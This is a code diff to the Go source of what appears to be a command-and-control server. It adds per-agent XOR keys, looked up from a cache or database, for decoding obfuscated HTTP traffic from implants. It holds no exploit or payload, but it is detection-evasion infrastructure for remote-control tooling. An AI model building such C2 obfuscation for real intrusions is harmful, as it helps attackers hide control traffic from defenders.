@@ -5,6 +5,7 @@ import (
 	"c2/internal/common/config"
 	"c2/internal/common/transforms"
 	pb "c2/proto"
+	"database/sql"
 	"fmt"
 	"io"
 	"log"
@@ -41,6 +42,31 @@ func (m *Manager) validateClientID(clientID string) (*InitData, error) {
 		return nil, err
 	}
 	return initData, nil
+}
+
+// getHTTPXorKeyForAgent retrieves the per-build unique HTTP XOR key for an agent
+func (m *Manager) getHTTPXorKeyForAgent(clientID string) string {
+	// Try to get from InitData cache first
+	if initData, err := m.GetInitData(clientID); err == nil && initData.HTTPXorKey != "" {
+		log.Printf("[HTTPTransform] Using per-agent HTTP XOR key for %s (from init cache)", clientID)
+		return initData.HTTPXorKey
+	}
+
+	// Fall back to database lookup via connections table
+	var xorKey sql.NullString
+	err := m.db.QueryRow(`
+        SELECT i.http_xor_key FROM inits i
+        INNER JOIN connections c ON c.clientID = i.clientID::text
+        WHERE c.newclientID = $1 OR c.clientID = $1`,
+		clientID).Scan(&xorKey)
+
+	if err == nil && xorKey.Valid && xorKey.String != "" {
+		log.Printf("[HTTPTransform] Using per-agent HTTP XOR key for %s (from database)", clientID)
+		return xorKey.String
+	}
+
+	// No per-agent key found - will use profile's static key
+	return ""
 }
 
 // getRemoteIP extracts the real IP address from the request
@@ -152,7 +178,8 @@ func convertConfigTransforms(cfgTransforms []config.Transform) []transforms.Tran
 
 // extractClientIDFromDataBlock extracts clientID using DataBlock configuration
 // Falls back to legacy extraction if dataBlock is nil
-func (m *Manager) extractClientIDFromDataBlock(r *http.Request, dataBlock *config.DataBlock, legacyHandler config.Handler, basePath string) (string, error) {
+// xorKeyOverride: if provided, replaces XOR transform values for per-agent unique keys
+func (m *Manager) extractClientIDFromDataBlock(r *http.Request, dataBlock *config.DataBlock, legacyHandler config.Handler, basePath string, xorKeyOverride string) (string, error) {
 	// Fall back to legacy extraction if no DataBlock configured
 	if dataBlock == nil {
 		return m.extractClientID(r, legacyHandler)
@@ -172,6 +199,11 @@ func (m *Manager) extractClientIDFromDataBlock(r *http.Request, dataBlock *confi
 	// Convert config transforms to transform package types
 	xforms := convertConfigTransforms(dataBlock.Transforms)
 
+	// Override XOR values with per-agent unique key if provided
+	if xorKeyOverride != "" {
+		xforms = overrideXorValue(xforms, xorKeyOverride)
+	}
+
 	// Reverse transforms to get original clientID (pass 0 to use transform's Length)
 	clientIDBytes, err := transforms.Reverse(rawData, xforms, 0, 0)
 	if err != nil {
@@ -188,7 +220,8 @@ func (m *Manager) extractClientIDFromDataBlock(r *http.Request, dataBlock *confi
 
 // extractDataFromDataBlock extracts and reverses transforms on request data
 // Returns raw data if dataBlock is nil (legacy mode)
-func (m *Manager) extractDataFromDataBlock(r *http.Request, dataBlock *config.DataBlock, basePath string) ([]byte, error) {
+// xorKeyOverride: if provided, replaces XOR transform values for per-agent unique keys
+func (m *Manager) extractDataFromDataBlock(r *http.Request, dataBlock *config.DataBlock, basePath string, xorKeyOverride string) ([]byte, error) {
 	// Legacy mode: read body directly
 	if dataBlock == nil {
 		return io.ReadAll(r.Body)
@@ -211,5 +244,11 @@ func (m *Manager) extractDataFromDataBlock(r *http.Request, dataBlock *config.Da
 
 	// Convert and reverse transforms
 	xforms := convertConfigTransforms(dataBlock.Transforms)
+
+	// Override XOR values with per-agent unique key if provided
+	if xorKeyOverride != "" {
+		xforms = overrideXorValue(xforms, xorKeyOverride)
+	}
+
 	return transforms.Reverse(rawData, xforms, prependLen, appendLen)
 }
